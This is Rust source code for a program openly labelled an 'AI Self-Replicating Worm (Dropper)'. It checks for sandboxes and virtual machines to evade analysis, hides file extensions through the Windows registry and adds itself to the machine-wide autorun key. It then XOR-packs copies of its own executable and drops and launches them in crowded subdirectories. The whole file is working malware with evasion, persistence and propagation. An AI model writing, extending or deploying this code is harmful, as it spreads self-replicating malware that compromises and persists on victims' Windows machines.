use clap::Parser;
use rand::Rng;
use std::path::Path;
use walkdir::WalkDir;
use winreg::enums::*;
use winreg::RegKey;
use sysinfo::{ProcessExt, System, SystemExt};
use num_cpus;

#[derive(Parser)]
#[command(name = "AI Self-Replicating Worm (Dropper)")]
#[command(about = "An AI-powered dropper worm that intelligently replicates executables, hides extensions, and adds to autorun")]
struct Args {
    /// Scan and spread the worm
    #[arg(long)]
    scan: bool,

    /// Hide file extensions
    #[arg(long)]
    hide: bool,

    /// Add to autorun
    #[arg(long)]
    autorun: bool,

    /// Enable verbose logging
    #[arg(long)]
    verbose: bool,
}

fn get_own_binary() -> Option<Vec<u8>> {
    std::fs::read(std::env::current_exe().ok()?).ok()
}

fn is_in_sandbox() -> bool {
    // Check CPU cores
    if num_cpus::get() < 2 {
        return true;
    }
    // Check total memory (MB)
    let mut sys = System::new_all();
    sys.refresh_all();
    let total_memory = sys.total_memory() / 1024 / 1024;
    if total_memory < 2048 {
        return true;
    }
    // Check for suspicious processes
    let processes = sys.processes();
    for (_pid, process) in processes {
        let name = process.name().to_lowercase();
        if name.contains("sandbox") || name.contains("vmware") || name.contains("virtualbox") || name.contains("qemu") {
            return true;
        }
    }
    // Check uptime (seconds)
    if sys.uptime() < 300 { // Less than 5 minutes
        return true;
    }
    false
}

fn hide_file_extensions() {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    if let Ok(key) = hkcu.open_subkey_with_flags(
        r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced",
        KEY_SET_VALUE,
    ) {
        if key.set_value("HideFileExt", &1u32).is_ok() {
            println!("[+] File extensions hidden");
        } else {
            println!("[-] Failed to hide file extensions");
        }
    } else {
        println!("[-] Failed to open registry key for hiding extensions");
    }
}

fn add_to_autorun() {
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    if let Ok(key) = hklm.open_subkey_with_flags(
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        KEY_SET_VALUE,
    ) {
        if let Ok(exe_path) = std::env::current_exe() {
            if let Some(exe_str) = exe_path.to_str() {
                if key.set_value("SelfReplicatingWorm", &exe_str).is_ok() {
                    println!("[+] Added to autorun");
                } else {
                    println!("[-] Failed to add to autorun");
                }
            } else {
                println!("[-] Failed to convert exe path to string");
            }
        } else {
            println!("[-] Failed to get exe path");
        }
    } else {
        println!("[-] Failed to get exe path");
    }
}

fn ai_decide_to_drop(file_count: f32, depth: f32, verbose: bool) -> bool {
    // Use simple heuristic instead of real-time training for performance
    // Drop if directory has more than 10 files and depth > 2 (crowded and deep)
    let decision = file_count > 10.0 && depth > 2.0;

    if verbose {
        println!("[AI] Directory has {} files, depth {}, deciding to {}", file_count, depth, if decision { "drop" } else { "skip" });
    }
    decision
}

// Process injection placeholder - requires Windows API shellcode for full implementation

// Removed polymorphic_encrypt - now handled inline in drop_and_spawn_to_directory

// PE Packer - creates a self-decrypting executable with compiled assembly stub
fn pe_pack(binary: &[u8]) -> Vec<u8> {
    // Load the compiled assembly stub
    let stub_code = match std::fs::read("stub.exe") {
        Ok(code) => code,
        Err(_) => {
            eprintln!("[-] ERROR: stub.exe not found! Compile stub.asm first:");
            eprintln!("    nasm -f bin stub.asm -o stub.exe");
            eprintln!("    or use MASM: ml /c /coff stub.asm && link /subsystem:windows stub.obj");
            // Fallback to dummy for compilation
            vec![0x4D, 0x5A, 0x00, 0x00]
        }
    };

    let mut packed = stub_code;
    packed.extend_from_slice(b"PE_PACK"); // Custom signature for stub to find
    packed.extend_from_slice(&(binary.len() as u32).to_le_bytes()); // Payload size
    packed.extend(binary); // Payload (will be encrypted later)
    packed
}

// Custom Loader - validates packed executable format
// In a real implementation, this would be the stub code that runs first
#[allow(dead_code)] // Placeholder for future implementation
fn custom_loader(packed: &[u8]) -> bool {
    // Check MZ header (stub is executable)
    if packed.len() < 2 || packed[0] != 0x4D || packed[1] != 0x5A {
        return false;
    }

    // Find custom signature in the stub
    // In real stub: scan for "PE_PACK" signature
    let signature_pos = packed.windows(7).position(|w| w == b"PE_PACK");
    if signature_pos.is_none() {
        return false;
    }
    let sig_start = signature_pos.unwrap();

    // Extract payload size (4 bytes after signature)
    if packed.len() < sig_start + 11 {
        return false;
    }
    let size_start = sig_start + 7;
    let original_size = u32::from_le_bytes(packed[size_start..size_start+4].try_into().unwrap()) as usize;

    // Verify payload exists
    let payload_start = size_start + 4;
    if packed.len() < payload_start + original_size {
        return false;
    }

    // In a real stub implementation:
    // 1. Locate polymorphic key (first byte of payload)
    // 2. Allocate memory for decrypted payload
    // 3. XOR decrypt payload[1..] using key
    // 4. Jump to decrypted code in memory

    true
}

fn drop_and_spawn_to_directory(target_dir: &Path, binary: &[u8], verbose: bool) {
    // Create packed binary with stub + encrypted payload
    let mut packed_binary = pe_pack(binary);

    // Encrypt only the payload part (after stub), keep stub executable
    let sig_size = 7; // "PE_PACK"
    let size_size = 4; // 4 bytes for size
    let stub_size = packed_binary.len() - binary.len() - sig_size - size_size; // Calculate actual stub size
    let payload_start = stub_size + sig_size + size_size;

    if packed_binary.len() > payload_start {
        // Encrypt payload in-place
        let mut rng = rand::thread_rng();
        let key: u8 = rng.gen();

        // Store key at the beginning of payload
        packed_binary[payload_start] = key;

        // Encrypt the rest of payload (skip MZ header preservation since payload isn't executable)
        for i in (payload_start + 2)..packed_binary.len() {
            packed_binary[i] ^= key;
        }
    }

    // Fallback to file drop (process injection placeholder for future implementation)
    let mut rng = rand::thread_rng();
    let random_name = format!("worm_{}.exe", rng.gen_range(1000..10000));
    let target_path = target_dir.join(random_name);

    if std::fs::write(&target_path, &packed_binary).is_ok() {
        println!("[+] Dropped packed polymorphic executable to: {:?}", target_path);
        if let Ok(child) = std::process::Command::new(&target_path).spawn() {
            println!("[+] Spawned process: {}", child.id());
        } else {
            println!("[-] Failed to spawn process");
        }
    } else {
        if verbose {
            println!("[-] Failed to drop executable to: {:?}", target_path);
        }
    }
}

fn scan_and_spread(verbose: bool) {
    if let Some(my_binary) = get_own_binary() {
        let current_dir = std::env::current_dir().unwrap_or_else(|_| Path::new(".").to_path_buf());
        println!("[*] AI Worm (Dropper) started at: {:?}", current_dir);

        let mut entries = vec![];
        for entry in WalkDir::new(&current_dir).into_iter().filter_map(|e| e.ok()) {
            if entry.file_type().is_dir() {
                entries.push(entry);
            }
        }
        for entry in &entries {
            if verbose {
                println!("Scanning directory: {:?}", entry.path());
            }
            let dir_name = entry.file_name().to_str().unwrap_or("");
            let depth = entry.depth();
            if !["__pycache__", "System", "Windows"].contains(&dir_name) && ai_decide_to_drop(entries.len() as f32, depth as f32, verbose) {
                drop_and_spawn_to_directory(entry.path(), &my_binary, verbose);
            }
        }
    } else {
        println!("[-] Failed to get own binary");
    }
}

fn print_banner() {
    println!("AI Self-Replicating Worm (Dropper) v1.0");
    println!("=====================================");
    println!("Warning: This is malware. Use at your own risk.");
    println!();
}

fn main() {
    print_banner();
    let args = Args::parse();
    let verbose = args.verbose;
    if is_in_sandbox() {
        println!("[-] Detected sandbox environment. Exiting.");
        return;
    }
    let run_all = !args.scan && !args.hide && !args.autorun;

    if args.hide || run_all {
        hide_file_extensions();
    }
    if args.autorun || run_all {
        add_to_autorun();
    }
    if args.scan || run_all {
        scan_and_spread(verbose);
    }
}
